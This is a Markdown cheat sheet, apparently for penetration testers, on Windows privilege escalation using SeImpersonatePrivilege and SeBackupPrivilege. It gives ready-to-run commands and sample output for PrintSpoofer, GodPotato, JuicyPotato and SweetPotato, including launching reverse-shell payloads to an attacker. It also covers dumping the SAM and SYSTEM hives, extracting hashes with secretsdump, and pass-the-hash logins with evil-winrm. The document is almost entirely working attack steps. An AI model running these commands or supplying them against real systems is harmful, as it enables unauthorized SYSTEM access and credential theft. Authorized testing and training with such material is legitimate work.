# TOKEN PRIVILEGES (POTATO ATTACKS)

### Check for SeImpersonatePrivilege

Service accounts often have this — Gateway to SYSTEM

```bash
whoami /priv
Look for: SeImpersonatePrivilege
```

<details>
<summary>Example Output</summary>

```
whoami /priv
SeImpersonatePrivilege: Enabled

.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named Pipe: \\.\pipe\test\pipe
C:\> whoami
nt authority\system
```
</details>

---

### PrintSpoofer

Windows 10 / Server 2016+ — Fast and reliable

```bash
.\PrintSpoofer64.exe -i -c cmd
```

<details>
<summary>Example Output</summary>

```
.\PrintSpoofer64.exe -i -c cmd
[+] Got SYSTEM shell
C:\Windows\system32> whoami
nt authority\system
(From service account to SYSTEM in seconds)
```
</details>

---

### GodPotato

Works on most Windows versions — Newer, more reliable

```bash
.\GodPotato-NET4.exe -cmd 'cmd /c whoami'
```

<details>
<summary>Example Output</summary>

```
.\GodPotato-NET4.exe -cmd 'cmd /c whoami'
[*] CombaseDisableUserDirectoryPatching
nt authority\system
```
</details>

---

### JuicyPotato

Windows Server 2016/2019 — Needs valid CLSID

```bash
.\JuicyPotato.exe -l 1337 -p cmd.exe -a '/c C:\temp\rev.exe' -t *
```

<details>
<summary>Example Output</summary>

```
.\JuicyPotato.exe -l 1337 -p cmd.exe -a '/c C:\temp\rev.exe' -t *
[+] CreateProcessWithToken: OK

Attacker:
connect from 10.10.10.5
C:\> whoami
nt authority\system
```
</details>

---

### SweetPotato

Combines multiple potato techniques — Try if others fail

```bash
.\SweetPotato.exe -e EfsRpc -p C:\temp\rev.exe
```

<details>
<summary>Example Output</summary>

```
.\SweetPotato.exe -e EfsRpc -p C:\temp\rev.exe
[+] Exploiting EfsRpc
[+] Got SYSTEM token

Attacker shell:
C:\> whoami
nt authority\system
```
</details>

---

### Check for SeBackupPrivilege

Can read any file on system — Read SAM/SYSTEM hives, extract hashes

```bash
whoami /priv
Look for: SeBackupPrivilege
```

<details>
<summary>Example Output</summary>

```
whoami /priv
SeBackupPrivilege  Enabled

This means you can READ ANY FILE on the system
Exploit: dump SAM and SYSTEM registry hives

reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
(Then extract hashes with secretsdump)
```
</details>

---

### Backup privilege abuse

Dump registry hives — Extract local admin hashes

```bash
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
impacket-secretsdump -sam sam -system system LOCAL
```

<details>
<summary>Example Output</summary>

```
Transfer SAM + SYSTEM to attacker:
impacket-secretsdump -sam sam -system system LOCAL

Administrator:500:aad3b435b...:31d6cfe0d...
Guest:501:aad3b435b...:31d6cfe0d...

Now pass-the-hash:
evil-winrm -i 10.10.10.5 -u Administrator -H 31d6cfe0d...
(Full admin access from backup privilege)
```
</details>

---
